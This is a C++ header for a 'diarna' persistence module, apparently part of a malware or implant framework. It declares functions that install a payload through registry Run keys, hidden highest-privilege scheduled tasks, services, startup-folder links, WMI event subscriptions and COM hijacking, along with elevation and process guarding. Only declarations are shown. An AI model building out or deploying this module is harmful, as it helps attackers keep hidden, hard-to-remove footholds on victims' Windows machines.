#pragma once
#include <diarna/compiler_port.hpp>
#include <diarna/core/config.hpp>
#include <string>
#include <vector>
#include <memory>

namespace diarna::persistence {

enum class Method { RegistryRun, ScheduledTask, WindowsService,
                    StartupFolder, WmiSubscription, ComHijack, All };

class PersistenceManager {
public:
    explicit PersistenceManager(const PersistenceConfig& config);
    ~PersistenceManager();

    bool install();
    bool install(Method method);
    bool uninstall();
    bool uninstall(Method method);
    bool is_installed(Method method) const;
    bool elevate_and_install();
    bool guard_process();

private:
    PersistenceConfig config_;
    std::wstring payload_path_;

    bool install_registry();
    bool install_scheduled_task();
    bool install_service();
    bool install_startup();
    bool install_wmi();
    bool install_com_hijack();
    bool uninstall_registry();
    bool uninstall_scheduled_task();
    bool uninstall_service();
    bool uninstall_startup();
    bool uninstall_wmi();
    bool uninstall_com_hijack();
};

// Re-export individual persistence methods
namespace registry {
    bool create_run_key(const std::wstring& name, const std::wstring& path);
    bool create_run_key_hklm(const std::wstring& name, const std::wstring& path);
    bool delete_run_key(const std::wstring& name);
    bool exists_run_key(const std::wstring& name);
}
namespace scheduled_task {
    bool create(const std::wstring& name, const std::wstring& path,
                const std::wstring& args = L"",
                bool hidden = true, bool highest = true,
                const std::wstring& trigger = L"logon");
    bool delete_task(const std::wstring& name);
    bool exists(const std::wstring& name);
}
namespace service {
    bool create(const std::wstring& name, const std::wstring& display,
                const std::wstring& path, const std::wstring& args = L"",
                uint32_t start_type = 2);
    bool delete_service(const std::wstring& name);
    bool exists(const std::wstring& name);
    bool set_failure_action(const std::wstring& name);
}
namespace startup_folder {
    bool create_link(const std::wstring& name, const std::wstring& target,
                     const std::wstring& args = L"");
    bool create_link_all_users(const std::wstring& name, const std::wstring& target,
                               const std::wstring& args = L"");
    bool remove(const std::wstring& name);
}
namespace wmi {
    bool subscribe(const std::wstring& name, const std::wstring& command,
                   const std::wstring& query = L"");
    bool remove(const std::wstring& name);
}
namespace com_hijack {
    bool hijack_clsid(const std::wstring& clsid, const std::wstring& dll_path);
    bool restore_clsid(const std::wstring& clsid);
    std::vector<std::wstring> find_missing_clsid();
}

} // namespace diarna::persistence
